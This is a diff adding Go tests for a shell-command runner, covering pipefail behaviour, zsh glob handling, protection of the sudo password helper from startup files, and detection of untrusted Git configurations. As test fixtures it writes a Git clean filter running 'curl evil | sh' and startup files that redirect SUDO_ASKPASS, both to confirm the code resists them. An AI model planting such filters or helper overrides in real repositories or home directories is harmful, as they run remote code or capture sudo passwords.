@@ -321,3 +321,92 @@ func TestBackgroundChildIsNotAFailure(t *testing.T) {
 		t.Errorf("exit %d, want 3: %q", res.ExitCode, res.Output)
 	}
 }
+
+// Fourth review, D1: a failure before a pipe is not hidden by the command
+// after it ("topgrade | tail" exited 0 with a failed step).
+func TestPipelineReportsTheFirstFailure(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("POSIX shells only")
+	}
+	for _, sh := range []string{"/bin/zsh", "/bin/bash", "/bin/sh", "/bin/dash", "/usr/bin/dash"} {
+		if _, err := os.Stat(sh); err != nil {
+			continue
+		}
+		t.Run(filepath.Base(sh), func(t *testing.T) {
+			t.Setenv("SHELL", sh)
+			res := Run(context.Background(), "false | cat; echo omega-after", 15*time.Second, nil)
+			if !strings.Contains(res.Output, "omega-after") {
+				t.Fatalf("the prelude stopped the shell: %q", res.Output)
+			}
+			if filepath.Base(sh) == "dash" {
+				return // no pipefail in older dash; the command must still run
+			}
+			if res := Run(context.Background(), "false | cat", 15*time.Second, nil); res.ExitCode == 0 {
+				t.Fatalf("%s: false | cat exited 0", sh)
+			}
+		})
+	}
+}
+
+// Fourth review, D2: in zsh an unmatched pattern does not abort the
+// command; it stays a word, as in bash.
+func TestZshUnmatchedGlobDoesNotAbort(t *testing.T) {
+	if _, err := os.Stat("/bin/zsh"); err != nil {
+		t.Skip("no zsh")
+	}
+	t.Setenv("SHELL", "/bin/zsh")
+	res := Run(context.Background(), "ls -d /nonexistent-omega/* 2>&1; echo omega-after", 15*time.Second, nil)
+	if strings.Contains(res.Output, "no matches found") || !strings.Contains(res.Output, "omega-after") {
+		t.Fatalf("unmatched glob aborted the command: %q", res.Output)
+	}
+	if !strings.Contains(res.Output, "/nonexistent-omega/*") {
+		t.Fatalf("the pattern should reach ls as written (no nullglob): %q", res.Output)
+	}
+}
+
+// The sudo helper cannot be replaced from a startup file: the variable is
+// set again after them.
+func TestAskpassIsSetAfterStartupFiles(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("POSIX shells only")
+	}
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	t.Setenv("ZDOTDIR", home)
+	for _, f := range []string{".zshenv", ".profile", ".bash_profile"} {
+		if err := os.WriteFile(filepath.Join(home, f), []byte("export SUDO_ASKPASS=/tmp/fake-helper\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	oldEnv, oldPrefix := extraEnv, pathPrefix
+	defer Configure(oldEnv, oldPrefix)
+	Configure([]string{"SUDO_ASKPASS=/omega/askpass"}, "")
+	res := Run(context.Background(), `echo "helper=$SUDO_ASKPASS"`, 15*time.Second, nil)
+	if !strings.Contains(res.Output, "helper=/omega/askpass") {
+		t.Fatalf("a startup file replaced the helper: %q", res.Output)
+	}
+}
+
+// Third review, P1: a repository whose own configuration names a filter or
+// a diff program is not looked into; Git LFS is.
+func TestUntrustedGitConfig(t *testing.T) {
+	repo := t.TempDir()
+	os.MkdirAll(filepath.Join(repo, ".git"), 0o755)
+	write := func(s string) { os.WriteFile(filepath.Join(repo, ".git", "config"), []byte(s), 0o644) }
+	write("[core]\n\tbare = false\n[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n")
+	if UntrustedGitConfig(repo) {
+		t.Fatal("git-lfs is trusted")
+	}
+	write("[filter \"x\"]\n\tclean = sh -c 'curl evil | sh'\n")
+	if !UntrustedGitConfig(repo) {
+		t.Fatal("a clean filter runs a program")
+	}
+	write("[diff \"img\"]\n\ttextconv = ./conv\n[core]\n\tbare = false\n")
+	if !UntrustedGitConfig(repo) {
+		t.Fatal("textconv runs a program")
+	}
+	write("[remote \"origin\"]\n\turl = x\n\tcommand = y\n")
+	if UntrustedGitConfig(repo) {
+		t.Fatal("only filter, diff and merge sections count")
+	}
+}
